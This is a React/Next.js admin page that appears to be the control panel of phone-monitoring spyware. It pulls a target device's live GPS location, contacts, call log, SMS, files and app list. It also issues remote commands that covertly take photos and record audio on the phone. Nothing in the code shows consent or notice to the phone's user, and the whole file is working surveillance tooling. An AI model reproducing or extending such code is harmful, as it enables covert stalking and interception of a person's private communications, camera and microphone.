// app/admin/devices/[id]/page.tsx
"use client";

import React, { useEffect, useState, useCallback } from "react";
import { useParams } from "next/navigation";
import { MonitoredDevice, DeviceLocation, DeviceContact, DeviceCall, DeviceMessage, DeviceFileItem } from "@/lib/device-types";
import { DeviceDetailHeader } from "@/components/admin/devices/DeviceDetailHeader";
import { DeviceTabViews } from "@/components/admin/devices/DeviceTabViews";
import { AudioCapture } from "@/components/admin/devices/DeviceAudioGallery";
import { MapPin, Camera, User, Phone, MessageSquare, Layers, Mic, Radio, Folder } from "lucide-react";
import { createClient } from "@/lib/supabase/client";

export default function DeviceDetailPage() {
  const params = useParams();
  const deviceId = params.id as string;

  const [device, setDevice] = useState<MonitoredDevice | null>(null);
  const [locations, setLocations] = useState<DeviceLocation[]>([]);
  const [contacts, setContacts] = useState<DeviceContact[]>([]);
  const [calls, setCalls] = useState<DeviceCall[]>([]);
  const [messages, setMessages] = useState<DeviceMessage[]>([]);
  const [captures, setCaptures] = useState<any[]>([]);
  const [audioClips, setAudioClips] = useState<AudioCapture[]>([]);
  const [files, setFiles] = useState<DeviceFileItem[]>([]);
  const [filesLoading, setFilesLoading] = useState(false);
  const [appCount, setAppCount] = useState(0);
  const [activeTab, setActiveTab] = useState("map");
  const [loading, setLoading] = useState(true);
  const [toast, setToast] = useState<string | null>(null);
  const [isLiveMovement, setIsLiveMovement] = useState(false);

  const showToast = (msg: string) => {
    setToast(msg);
    setTimeout(() => setToast(null), 3500);
  };

  // Ultra-fast lightweight poll: only fetches device status, latest location & commands
  const fetchLightStatus = useCallback(async () => {
    if (!deviceId) return;
    try {
      const t = Date.now();
      const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };
      const [devRes, locRes, cmdRes] = await Promise.all([
        fetch(`/api/devices/${deviceId}?_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/data?type=locations&limit=25&_t=${t}`, noStore).then((r) => r.json()),
        fetch(`/api/devices/${deviceId}/commands?_t=${t}`, noStore).then((r) => r.json()),
      ]);

      if (devRes.device) {
        setDevice(devRes.device);
        if (devRes.device.counts?.apps) setAppCount(devRes.device.counts.apps);
      }
      if (locRes.locations) setLocations(locRes.locations);
      if (cmdRes.commands) {
        setCaptures(cmdRes.commands.filter((c: any) => c.command === "take_photo" && c.result_media_path));
        setAudioClips(cmdRes.commands.filter((c: any) => c.command === "record_audio" && c.result_media_path));
      }
    } catch (err) {
      console.error("Telemetry fetch error", err);
    } finally {
      setLoading(false);
    }
  }, [deviceId]);

  // High-speed lazy loading: only loads heavy data when that tab is clicked
  useEffect(() => {
    if (!deviceId) return;
    const t = Date.now();
    const noStore = { cache: "no-store" as RequestCache, headers: { "Cache-Control": "no-cache" } };

    const load = (type: string, setter: (d: any) => void) => {
      fetch(`/api/devices/${deviceId}/data?type=${type}&limit=250&_t=${t}`, noStore)
        .then((r) => r.json())
        .then((res) => { if (res[type]) setter(res[type]); });
    };

    if (activeTab === "contacts" && contacts.length === 0) load("contacts", setContacts);
    else if (activeTab === "calls" && calls.length === 0) load("calls", setCalls);
    else if (activeTab === "messages" && messages.length === 0) load("messages", setMessages);
    else if (activeTab === "gallery" && files.length === 0) {
      setFilesLoading(true);
      fetch(`/api/devices/${deviceId}/data?type=files&limit=200&_t=${t}`, noStore)
        .then((r) => r.json())
        .then((res) => { if (res.files) setFiles(res.files); })
        .finally(() => setFilesLoading(false));
    }
  }, [activeTab, deviceId, contacts.length, calls.length, messages.length, files.length]);

  useEffect(() => {
    fetchLightStatus();
    const interval = setInterval(fetchLightStatus, 12000);
    return () => clearInterval(interval);
  }, [fetchLightStatus]);

  // Realtime Live Movement subscription
  useEffect(() => {
    if (!deviceId || !isLiveMovement) return;
    const supabase = createClient();
    const channel = supabase
      .channel(`device-live:${deviceId}`)
      .on("broadcast", { event: "location" }, (payload: any) => {
        if (payload.payload?.latitude && payload.payload?.longitude) {
          const newPoint = payload.payload;
          setLocations((prev) => [newPoint, ...prev.slice(0, 49)]);
        }
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [deviceId, isLiveMovement]);

  const sendCommand = async (command: string, payload = {}, label = "Command") => {
    await fetch(`/api/devices/${deviceId}/commands`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ command, payload }),
    });
    showToast(`⚡ ${label} sent to phone!`);
    fetchLightStatus();
  };

  const handleToggleLiveMovement = (active: boolean) => {
    setIsLiveMovement(active);
    sendCommand(active ? "start_live_movement" : "stop_live_movement", {}, active ? "Live Movement ON" : "Live Movement OFF");
  };

  const handleDeleteCommand = async (cmdId: string) => {
    await fetch(`/api/devices/${deviceId}/commands?command_id=${cmdId}`, { method: "DELETE" });
    showToast("🗑️ Item deleted successfully!");
    fetchLightStatus();
  };

  if (loading && !device) {
    return <div className="flex items-center justify-center min-h-[400px]"><div className="w-8 h-8 rounded-full border-2 border-[#FFFC00] border-t-transparent animate-spin" /></div>;
  }
  if (!device) return <div className="p-8 text-center text-white/50">Device not found</div>;

  const TABS = [
    { id: "map", label: "Live Map", icon: MapPin },
    { id: "stream", label: "Live Feed", icon: Radio },
    { id: "gallery", label: `Gallery (${files.length})`, icon: Folder },
    { id: "camera", label: `Snaps (${captures.length})`, icon: Camera },
    { id: "audio", label: `Audio (${audioClips.length})`, icon: Mic },
    { id: "apps", label: `Apps (${appCount})`, icon: Layers },
    { id: "contacts", label: `Contacts (${contacts.length})`, icon: User },
    { id: "calls", label: `Calls (${calls.length})`, icon: Phone },
    { id: "messages", label: `SMS (${messages.length})`, icon: MessageSquare },
  ];

  return (
    <div className="space-y-6 pb-20 md:pb-8">
      {toast && (
        <div className="fixed top-6 right-6 z-50 py-3 px-5 rounded-2xl bg-black/90 border border-[#FFFC00]/40 text-[#FFFC00] text-xs font-bold shadow-2xl backdrop-blur-xl flex items-center gap-2">
          <span>{toast}</span>
        </div>
      )}

      <DeviceDetailHeader device={device} onRefresh={fetchLightStatus} />

      <div className="flex items-center gap-1.5 p-1 rounded-2xl bg-slate-100 dark:bg-white/[0.03] border border-slate-200 dark:border-white/10 overflow-x-auto select-none">
        {TABS.map(({ id, label, icon: Icon }) => (
          <button
            key={id}
            onClick={() => setActiveTab(id)}
            className={`flex items-center gap-2 py-2.5 px-3.5 rounded-xl text-xs font-bold transition-all shrink-0 ${
              activeTab === id
                ? "bg-amber-100 text-amber-900 dark:bg-[#FFFC00] dark:text-black shadow-md"
                : "text-slate-600 dark:text-white/60 hover:text-slate-900 dark:hover:text-white hover:bg-white/5"
            }`}
          >
            <Icon className="w-3.5 h-3.5" />
            {label}
          </button>
        ))}
      </div>

      <DeviceTabViews
        activeTab={activeTab}
        device={device}
        locations={locations}
        contacts={contacts}
        calls={calls}
        messages={messages}
        captures={captures}
        audioClips={audioClips}
        files={files}
        filesLoading={filesLoading}
        isLiveMovement={isLiveMovement}
        onToggleLiveMovement={handleToggleLiveMovement}
        onSendCommand={sendCommand}
        onDeleteCommand={handleDeleteCommand}
      />
    </div>
  );
}
